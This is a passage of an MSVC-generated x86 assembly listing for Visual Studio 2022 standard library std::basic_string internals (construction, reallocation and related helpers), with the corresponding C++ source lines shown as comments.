; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  00087	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0008a	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  0008f	e9 94 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00094	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00097	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  0009c	50		 push	 eax
  0009d	6a 0f		 push	 15			; 0000000fH
  0009f	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000a2	52		 push	 edx
  000a3	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAIIII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  000a8	83 c4 0c	 add	 esp, 12			; 0000000cH
  000ab	89 45 ec	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000ae	8d 45 ec	 lea	 eax, DWORD PTR __New_capacity$[ebp]
  000b1	50		 push	 eax
  000b2	8b 4d e4	 mov	 ecx, DWORD PTR __Al$[ebp]
  000b5	51		 push	 ecx
  000b6	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  000bb	83 c4 08	 add	 esp, 8
  000be	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000c1	8d 55 f0	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000c4	52		 push	 edx
  000c5	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000c8	50		 push	 eax
  000c9	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  000ce	83 c4 08	 add	 esp, 8

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  000d1	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000d4	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000d7	89 51 10	 mov	 DWORD PTR [ecx+16], edx

; 2704 :         _My_data._Myres  = _New_capacity;

  000da	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000dd	8b 4d ec	 mov	 ecx, DWORD PTR __New_capacity$[ebp]
  000e0	89 48 14	 mov	 DWORD PTR [eax+20], ecx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

  000e3	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000e6	52		 push	 edx
  000e7	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  000ea	50		 push	 eax
  000eb	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000ee	51		 push	 ecx
  000ef	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000f4	83 c4 04	 add	 esp, 4
  000f7	50		 push	 eax
  000f8	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  000fd	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  00100	c6 45 fd 00	 mov	 BYTE PTR $T1[ebp], 0
  00104	8d 55 fd	 lea	 edx, DWORD PTR $T1[ebp]
  00107	52		 push	 edx
  00108	8b 45 f0	 mov	 eax, DWORD PTR __New_ptr$[ebp]
  0010b	50		 push	 eax
  0010c	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  00111	83 c4 04	 add	 esp, 4
  00114	03 45 0c	 add	 eax, DWORD PTR __Count$[ebp]
  00117	50		 push	 eax
  00118	e8 00 00 00 00	 call	 ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ; std::_Narrow_char_traits<char,int>::assign
  0011d	83 c4 08	 add	 esp, 8

; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  00120	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  00123	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:

; 2717 :     }

  00128	8b e5		 mov	 esp, ebp
  0012a	5d		 pop	 ebp
  0012b	c2 08 00	 ret	 8
??$_Construct@$00PBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXQBDI@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>, COMDAT
; _this$ = ecx

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$allocator@D@std@@QAE@XZ ; std::allocator<char>::allocator<char>
  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c2 04 00	 ret	 4
??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
__Val1$ = 12						; size = 4
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z PROC ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >, COMDAT
; _this$ = ecx

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Val1$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$forward@V?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ; std::forward<std::allocator<char> >
  00010	83 c4 04	 add	 esp, 4
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 08 00	 ret	 8
??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@D@1@@Z ENDP ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z PROC ; std::move<std::allocator<char> &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAV?$allocator@D@std@@@std@@YA$$QAV?$allocator@D@0@AAV10@@Z ENDP ; std::move<std::allocator<char> &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@II@std@@YAII@Z
_TEXT	SEGMENT
__Len$ = 8						; size = 4
??$_Convert_size@II@std@@YAII@Z PROC			; std::_Convert_size<unsigned int,unsigned int>, COMDAT

; 1112 :     sizeof(_Unsigned_type) <= sizeof(_Size_type)) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Len$[ebp]

; 1124 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$_Convert_size@II@std@@YAII@Z ENDP			; std::_Convert_size<unsigned int,unsigned int>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<char> > >, COMDAT

; 1583 : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1584 :     return __builtin_addressof(_Val);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 1585 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPAV?$_String_val@U?$_Simple_types@D@std@@@0@AAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_grow_by@V<lambda_67d87d4aa1269033985980465fd1d824>@@$$V@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_67d87d4aa1269033985980465fd1d824>@@@Z
_TEXT	SEGMENT
__Raw_new$ = -40					; size = 4
__Al$ = -36						; size = 4
__Old_ptr$1 = -32					; size = 4
__Old_capacity$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_size$ = -20					; size = 4
__New_ptr$ = -16					; size = 4
__Old_size$ = -12					; size = 4
_this$ = -8						; size = 4
__My_data$ = -4						; size = 4
__Size_increase$ = 8					; size = 4
__Fn$ = 12						; size = 1
??$_Reallocate_grow_by@V<lambda_67d87d4aa1269033985980465fd1d824>@@$$V@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_67d87d4aa1269033985980465fd1d824>@@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_67d87d4aa1269033985980465fd1d824> >, COMDAT
; _this$ = ecx

; 4807 :     _CONSTEXPR20 basic_string& _Reallocate_grow_by(const size_type _Size_increase, _Fty _Fn, _ArgTys... _Args) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 28	 sub	 esp, 40			; 00000028H
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4808 :         // reallocate to increase size by _Size_increase elements, new buffer prepared by
; 4809 :         // _Fn(_New_ptr, _Old_ptr, _Old_size, _Args...)
; 4810 :         auto& _My_data            = _Mypair._Myval2;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 fc	 mov	 DWORD PTR __My_data$[ebp], eax

; 4811 :         const size_type _Old_size = _My_data._Mysize;

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00012	8b 51 10	 mov	 edx, DWORD PTR [ecx+16]
  00015	89 55 f4	 mov	 DWORD PTR __Old_size$[ebp], edx

; 4812 :         if (max_size() - _Old_size < _Size_increase) {

  00018	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::max_size
  00020	2b 45 f4	 sub	 eax, DWORD PTR __Old_size$[ebp]
  00023	3b 45 08	 cmp	 eax, DWORD PTR __Size_increase$[ebp]
  00026	73 05		 jae	 SHORT $LN2@Reallocate

; 4813 :             _Xlen_string(); // result too long

  00028	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4814 :         }
; 4815 : 
; 4816 :         const size_type _New_size     = _Old_size + _Size_increase;

  0002d	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  00030	03 45 08	 add	 eax, DWORD PTR __Size_increase$[ebp]
  00033	89 45 ec	 mov	 DWORD PTR __New_size$[ebp], eax

; 4817 :         const size_type _Old_capacity = _My_data._Myres;

  00036	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00039	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  0003c	89 55 e4	 mov	 DWORD PTR __Old_capacity$[ebp], edx

; 4818 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  0003f	8b 45 ec	 mov	 eax, DWORD PTR __New_size$[ebp]
  00042	50		 push	 eax
  00043	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00046	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@ABEII@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
  0004b	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 4819 :         auto& _Al                     = _Getal();

  0004e	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00051	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
  00056	89 45 dc	 mov	 DWORD PTR __Al$[ebp], eax

; 4820 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00059	8d 4d e8	 lea	 ecx, DWORD PTR __New_capacity$[ebp]
  0005c	51		 push	 ecx
  0005d	8b 55 dc	 mov	 edx, DWORD PTR __Al$[ebp]
  00060	52		 push	 edx
  00061	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPADAAV?$allocator@D@1@AAI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Allocate_for_capacity<0>
  00066	83 c4 08	 add	 esp, 8
  00069	89 45 f0	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 4821 : 
; 4822 :         _My_data._Orphan_all();

  0006c	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  0006f	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QAEXXZ ; std::_Container_base0::_Orphan_all

; 4823 :         _ASAN_STRING_REMOVE(*this);
; 4824 :         _My_data._Mysize      = _New_size;

  00074	8b 45 fc	 mov	 eax, DWORD PTR __My_data$[ebp]
  00077	8b 4d ec	 mov	 ecx, DWORD PTR __New_size$[ebp]
  0007a	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 4825 :         _My_data._Myres       = _New_capacity;

  0007d	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  00080	8b 45 e8	 mov	 eax, DWORD PTR __New_capacity$[ebp]
  00083	89 42 14	 mov	 DWORD PTR [edx+20], eax

; 4826 :         _Elem* const _Raw_new = _Unfancy(_New_ptr);

  00086	8b 4d f0	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00089	51		 push	 ecx
  0008a	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  0008f	83 c4 04	 add	 esp, 4
  00092	89 45 d8	 mov	 DWORD PTR __Raw_new$[ebp], eax

; 4827 :         if (_Old_capacity > _Small_string_capacity) {

  00095	83 7d e4 0f	 cmp	 DWORD PTR __Old_capacity$[ebp], 15 ; 0000000fH
  00099	76 43		 jbe	 SHORT $LN3@Reallocate

; 4828 :             const pointer _Old_ptr = _My_data._Bx._Ptr;

  0009b	8b 55 fc	 mov	 edx, DWORD PTR __My_data$[ebp]
  0009e	8b 02		 mov	 eax, DWORD PTR [edx]
  000a0	89 45 e0	 mov	 DWORD PTR __Old_ptr$1[ebp], eax

; 4829 :             _Fn(_Raw_new, _Unfancy(_Old_ptr), _Old_size, _Args...);

  000a3	8b 4d f4	 mov	 ecx, DWORD PTR __Old_size$[ebp]
  000a6	51		 push	 ecx
  000a7	8b 55 e0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  000aa	52		 push	 edx
  000ab	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  000b0	83 c4 04	 add	 esp, 4
  000b3	50		 push	 eax
  000b4	8b 45 d8	 mov	 eax, DWORD PTR __Raw_new$[ebp]
  000b7	50		 push	 eax
  000b8	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000bb	e8 00 00 00 00	 call	 ??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z ; <lambda_67d87d4aa1269033985980465fd1d824>::operator()

; 4830 :             _Deallocate_for_capacity(_Al, _Old_ptr, _Old_capacity);

  000c0	8b 4d e4	 mov	 ecx, DWORD PTR __Old_capacity$[ebp]
  000c3	51		 push	 ecx
  000c4	8b 55 e0	 mov	 edx, DWORD PTR __Old_ptr$1[ebp]
  000c7	52		 push	 edx
  000c8	8b 45 dc	 mov	 eax, DWORD PTR __Al$[ebp]
  000cb	50		 push	 eax
  000cc	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAXAAV?$allocator@D@2@QADI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Deallocate_for_capacity
  000d1	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4831 :             _My_data._Bx._Ptr = _New_ptr;

  000d4	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000d7	8b 55 f0	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  000da	89 11		 mov	 DWORD PTR [ecx], edx

; 4832 :         } else {

  000dc	eb 24		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4833 :             _Fn(_Raw_new, _My_data._Bx._Buf, _Old_size, _Args...);

  000de	8b 45 f4	 mov	 eax, DWORD PTR __Old_size$[ebp]
  000e1	50		 push	 eax
  000e2	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000e5	51		 push	 ecx
  000e6	8b 55 d8	 mov	 edx, DWORD PTR __Raw_new$[ebp]
  000e9	52		 push	 edx
  000ea	8d 4d 0c	 lea	 ecx, DWORD PTR __Fn$[ebp]
  000ed	e8 00 00 00 00	 call	 ??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z ; <lambda_67d87d4aa1269033985980465fd1d824>::operator()

; 4834 :             _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000f2	8d 45 f0	 lea	 eax, DWORD PTR __New_ptr$[ebp]
  000f5	50		 push	 eax
  000f6	8b 4d fc	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000f9	51		 push	 ecx
  000fa	e8 00 00 00 00	 call	 ??$_Construct_in_place@PADABQAD@std@@YAXAAPADABQAD@Z ; std::_Construct_in_place<char *,char * const &>
  000ff	83 c4 08	 add	 esp, 8
$LN4@Reallocate:

; 4835 :         }
; 4836 : 
; 4837 :         _ASAN_STRING_CREATE(*this);
; 4838 :         return *this;

  00102	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@Reallocate:

; 4839 :     }

  00105	8b e5		 mov	 esp, ebp
  00107	5d		 pop	 ebp
  00108	c2 08 00	 ret	 8
??$_Reallocate_grow_by@V<lambda_67d87d4aa1269033985980465fd1d824>@@$$V@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEAAV01@IV<lambda_67d87d4aa1269033985980465fd1d824>@@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_67d87d4aa1269033985980465fd1d824> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__New_ptr$ = 8						; size = 4
__Old_ptr$ = 12						; size = 4
__Old_size$ = 16					; size = 4
??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z PROC ; <lambda_67d87d4aa1269033985980465fd1d824>::operator(), COMDAT
; _this$ = ecx

; 4260 :                 });

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 4259 :                     _Traits::copy(_New_ptr, _Old_ptr, _Old_size + 1);

  00007	8b 45 10	 mov	 eax, DWORD PTR __Old_size$[ebp]
  0000a	83 c0 01	 add	 eax, 1
  0000d	50		 push	 eax
  0000e	8b 4d 0c	 mov	 ecx, DWORD PTR __Old_ptr$[ebp]
  00011	51		 push	 ecx
  00012	8b 55 08	 mov	 edx, DWORD PTR __New_ptr$[ebp]
  00015	52		 push	 edx
  00016	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@DH@std@@SAPADQADQBDI@Z ; std::_Char_traits<char,int>::copy
  0001b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4260 :                 });

  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 0c 00	 ret	 12			; 0000000cH
??R<lambda_67d87d4aa1269033985980465fd1d824>@@QBE@QADQBDI@Z ENDP ; <lambda_67d87d4aa1269033985980465fd1d824>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z
_TEXT	SEGMENT
__Al$ = -28						; size = 4
__Alproxy$ = -24					; size = 4
__New_ptr$ = -20					; size = 4
__New_capacity$ = -16					; size = 4
_this$ = -12						; size = 4
__My_data$ = -8						; size = 4
__Proxy$ = -1						; size = 1
__Arg$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Construct@$01PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT
; _this$ = ecx

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f4	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __My_data$[ebp], eax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000f	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00017	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001a	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  0001c	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00021	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00029	89 45 e4	 mov	 DWORD PTR __Al$[ebp], eax

